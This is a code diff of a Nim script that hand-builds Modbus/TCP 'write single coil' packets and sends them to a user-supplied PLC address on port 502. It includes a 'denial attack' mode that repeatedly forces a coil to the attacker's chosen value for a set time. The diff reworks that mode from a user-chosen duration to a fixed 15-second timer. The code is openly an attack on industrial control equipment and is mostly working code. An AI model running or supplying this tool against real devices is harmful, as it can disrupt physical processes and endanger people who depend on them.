@@ -2,13 +2,6 @@ import std/[net, times, os]
 import strutils
 
 
-var
-    ip = "192.168.7.227"
-    port = 502
-    socket: Socket = newSocket()
-    packet: array[12, uint8] #create an array to maually build Modbus packet
-    denial: int
-#Fun string manipulation to get the correct hex format of number
 proc trimUpper(num: string): string =
   if num.len >= 2:
     return num[^4..^3]  # Slicing the last two characters. Really cool thing that I never knew I could do!
@@ -26,17 +19,15 @@ proc getUpperLower(coilString: string): (uint8, uint8) =
     let lower = uint8(parseHexInt("0x" & trimLower(coilString))) #Super cool functionality to convert to Hex!
     return (upper, lower)
 
-#Function to execute a denial attack for a certain time period in seconds
-proc denialTimer(durationOfAttack : int, packetPointer: ptr, packet: array): string =
-        const message: string = "Time is " 
+proc timer(): string =
+        const message: string = "Time is "
         let startTime: DateTime = now()
-        let countdownTime = initDuration(seconds = durationOfAttack)
+        let countdownTime = initDuration(seconds = 15)
 
         var elapsedTime: Duration = initDuration()
 
         while countdownTime > elapsedTime:
             sleep(100)
-            var output = socket.send(packetPointer, sizeof(packet))
             let currentTime: DateTime = now()
             elapsedTime = currentTime - startTime
             let timeLeft = countdownTime - elapsedTime
@@ -47,7 +38,12 @@ proc denialTimer(durationOfAttack : int, packetPointer: ptr, packet: array): str
 
         return "Completed"
 
-
+var
+    ip = "192.168.7.227"
+    port = 502
+    socket: Socket = newSocket()
+    packet: array[12, uint8]
+    denial: int
 
 echo "Please enter an IP address: "
 ip = readLine(stdin);
@@ -74,7 +70,7 @@ if selection == 1:
 
     #Create packet to write coil
     if selectionWrite == 1:
-        packet = [0x00'u8, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, upper, lower, 0xFF, 0x00]; #Upper = upper half of hex number. Lower = lower half of hex number
+        packet = [0x00'u8, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, upper, lower, 0xFF, 0x00];
     else:
         packet =   [0x00'u8, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, upper, lower, 0x00, 0x00];
 else:
@@ -84,12 +80,13 @@ var dataPtr1: ptr array = packet.addr
 var output: int
 
 if denial == 1:
-    echo "How long, in seconds, would you like to carry out the attack for?"
-    var attackTimeSec = readLine(stdin).parseInt()
-    #Runs a denial attack (forces the value to stay set on what the attacker wants) for     
-
-    var val: string = denialTimer(attackTimeSec, dataPtr1, packet)
-    echo val
+    #Runs a denial attack (forces the value to stay set on what the attacker wants) for 15 seconds
+    while true:
+        output = socket.send(dataPtr1, sizeof(packet))
+        var val: string = timer()
+        echo val
+        if val == "Completed":
+            break
 else:
     output = socket.send(dataPtr1, sizeof(packet))
     echo output
